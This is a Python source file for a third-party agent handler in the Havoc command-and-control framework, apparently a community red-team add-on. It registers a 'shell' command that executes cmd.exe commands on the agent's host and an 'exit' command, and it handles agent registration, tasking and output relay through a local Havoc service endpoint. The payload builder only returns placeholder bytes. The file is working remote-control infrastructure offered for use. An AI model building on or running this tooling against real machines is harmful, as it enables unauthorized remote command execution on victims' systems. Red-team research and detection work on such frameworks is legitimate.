from base64 import b64decode
import json
from havoc.service import HavocService
from havoc.agent import *
import os 

COMMAND_REGISTER         = 0x100
COMMAND_GET_JOB          = 0x101
COMMAND_NO_JOB           = 0x102
COMMAND_SHELL            = 0x152
COMMAND_EXIT             = 0x155
COMMAND_OUTPUT           = 0x200

# ====================
# ===== Commands =====
# ====================
class CommandShell(Command):
    CommandId = COMMAND_SHELL
    Name = "shell"
    Description = "executes commands using cmd.exe"
    Help = ""
    NeedAdmin = False
    Params = [
        CommandParam(
            name="commands",
            is_file_path=False,
            is_optional=False
        )
    ]
    Mitr = []

    def job_generate( self, arguments: dict ) -> bytes:
        Task = Packer()

        Task.add_data(arguments[ 'commands' ])
        return Task.buffer

class CommandExit( Command ):
    CommandId   = COMMAND_EXIT
    Name        = "exit"
    Description = "tells the python agent to exit"
    Help        = ""
    NeedAdmin   = False
    Mitr        = []
    Params      = []

    def job_generate( self, arguments: dict ) -> bytes:

        Task = Packer()

        Task.add_data("goodbye")

        return Task.buffer

# =======================
# ===== Agent Class =====
# =======================
class python(AgentType):
    Name = "Python"
    Author = "@codex_tf2"
    Version = "0.1"
    Description = f"""python 3rd party agent for Havoc"""
    MagicValue = 0x41414141

    Arch = [
        "x64",
        "x86",
    ]

    Formats = [
        {
            "Name": "Python script",
            "Extension": "py",
        },
    ]

    BuildingConfig = {
        "Sleep": "10"
    }

    Commands = [
        CommandShell(),
        CommandExit(),
    ]

    # generate. this function is getting executed when the Havoc client requests for a binary/executable/payload. you can generate your payloads in this function.
    def generate( self, config: dict ) -> None:

        print( f"config: {config}" )

        # builder_send_message. this function send logs/messages to the payload build for verbose information or sending errors (if something went wrong).
        self.builder_send_message( config[ 'ClientID' ], "Info", f"hello from service builder" )
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Options Config: {config['Options']}" )
        self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Config: {config['Config']}" )

        # build_send_payload. this function send back your generated payload
        self.builder_send_payload( config[ 'ClientID' ], self.Name + ".bin", "test bytes".encode('utf-8') ) # this is just an example.

    # this function handles incomming requests based on our magic value. you can respond to the agent by returning your data from this function.
    def response( self, response: dict ) -> bytes:
        agent_header    = response[ "AgentHeader" ]

        print("Receieved request from agent")
        agent_header    = response[ "AgentHeader" ]
        agent_response  = b64decode( response[ "Response" ] ) # the teamserver base64 encodes the request.
        #print(agent_response)
        agentjson = json.loads(agent_response)
        #print(agent_header)
        if agentjson["task"] == "register":
            #print(json.dumps(agentjson,indent=4))
            print("[*] Registered agent")
            self.register( agent_header, json.loads(agentjson["data"]) )
            AgentID = response[ "AgentHeader" ]["AgentID"]
            self.console_message( AgentID, "Good", f"Python agent {AgentID} registered", "" )
            return b'registered'
        elif agentjson["task"] == "gettask":

            AgentID = response[ "Agent" ][ "NameID" ]
            #self.console_message( AgentID, "Good", "Host checkin", "" )

            print("[*] Agent requested taskings")
            Tasks = self.get_task_queue( response[ "Agent" ] )
            print("Tasks retrieved")
            if len(agentjson["data"]) > 0:
                print("Output: " + agentjson["data"])
                self.console_message( AgentID, "Good", "Received Output:", agentjson["data"] )
            print(Tasks)
        return Tasks



def main():
    Havoc_python = python()
    print(os.getpid())
    print( "[*] Connect to Havoc service api" )
    Havoc_Service = HavocService(
        endpoint="ws://localhost:40056/service-endpoint",
        password="service-password"
    )

    print( "[*] Register python to Havoc" )
    Havoc_Service.register_agent(Havoc_python)

    return


if __name__ == '__main__':
    main()
